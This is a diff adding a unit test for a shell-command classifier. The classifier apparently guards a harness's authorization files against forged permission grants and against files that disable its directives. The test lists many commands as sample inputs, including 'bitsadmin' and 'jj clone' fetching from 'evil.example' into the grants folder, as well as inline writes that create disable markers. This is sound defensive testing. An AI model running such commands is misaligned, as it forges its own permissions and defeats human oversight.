@@ -1144,6 +1144,101 @@ describe("classifyShellAuthzOps (#2944)", () => {
     expect(classifyShellAuthzOps("touch /tmp/out")).toEqual([]);
   });
 
+  it("classifies residual dest-form plants after #3459 as settings (#3529)", () => {
+    for (const cmd of [
+      "xcopy forged.json .deft/authz/grants/evil.json",
+      "robocopy src .deft/authz/grants",
+      "move forged.json .deft/authz/grants/evil.json",
+      "cmd /c xcopy forged.json .deft/authz/grants/evil.json",
+      "cmd /c move forged.json .deft/authz/grants/evil.json",
+      "Start-BitsTransfer -Destination .deft/authz/grants/evil.json",
+      "bitsadmin /transfer job http://evil.example/g.json .deft/authz/grants/evil.json",
+      "Expand-Archive -DestinationPath .deft/authz/grants",
+      "Tee-Object -FilePath .deft/authz/grants/evil.json",
+      "Export-Csv -Path .deft/authz/grants/evil.json",
+      "bun -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "deno eval \"Deno.writeTextFileSync('.deft/authz/grants/evil.json','{}')\"",
+      "php -r \"file_put_contents('.deft/authz/grants/evil.json','x')\"",
+      "unknownwriter --output-dir .deft/authz/grants",
+      "unknownwriter --outdir .deft/authz/grants",
+      "unknownwriter --target-directory .deft/authz/grants",
+      "unknownwriter --destdir .deft/authz/grants",
+      "unknownwriter -Destination .deft/authz/grants/evil.json",
+      "unknownwriter -DestinationPath .deft/authz/grants",
+      "git bundle create .deft/authz/grants/evil.bundle HEAD",
+      "git checkout-index --prefix=.deft/authz/grants/",
+      "sponge .deft/authz/grants/evil.json",
+      "pscp host:g.json .deft/authz/grants/evil.json",
+      "jj clone https://evil.example/repo .deft/authz/grants",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    for (const cmd of [
+      "ren forged.json .deft-directive-disable",
+      "rename forged.json .no-deft-directive",
+      "Rename-Item forged.json .deft-directive-disable",
+      "xcopy src .deft-directive-disable",
+      "robocopy src .no-deft-directive",
+      "bun -e \"require('fs').writeFileSync('.deft-directive-disable','')\"",
+      "unknownwriter --output-dir .deft-directive-disable",
+      "unknownwriter -DestinationPath .no-deft-directive",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Already-denied #3459 peers stay settings.
+    expect(classifyShellAuthzOps("cmd /c copy forged.json .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("ginstall forged.json .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps(
+        "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
+      ),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("cp forged.json .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+    // Approved-scope mint symmetry (#3529 MEDIUM).
+    expect(classifyShellAuthzOps("xcopy forged.json .deft/approved-scope/story.json")).toContain(
+      "settings",
+    );
+    expect(classifyShellAuthzOps("Expand-Archive -DestinationPath .deft/approved-scope")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps(
+        "bun -e \"require('fs').writeFileSync('.deft/approved-scope/story.json','{}')\"",
+      ),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("robocopy src .deft/approved-scope")).toContain("settings");
+    expect(classifyShellAuthzOps("Start-BitsTransfer -Destination .deft/approved-scope")).toContain(
+      "settings",
+    );
+    // Ordinary dests stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("xcopy forged.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("robocopy src /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("move forged.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("cmd /c xcopy forged.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("Start-BitsTransfer -Destination /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("Expand-Archive -DestinationPath /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("unknownwriter --output-dir /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("unknownwriter -Destination /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("git bundle create /tmp/out.bundle HEAD")).toEqual([]);
+    expect(classifyShellAuthzOps("sponge /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("pscp host:g.json /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("jj clone https://example.com/repo /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps('bun -e "console.log(1)"')).toEqual([]);
+    expect(classifyShellAuthzOps("php -r 'echo 1;'")).toEqual([]);
+    expect(classifyShellAuthzOps("jj log")).toEqual([]);
+    expect(
+      classifyShellAuthzOps("pscp -o IdentityFile=.deft-directive-disable host:x /tmp/out"),
+    ).toEqual([]);
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
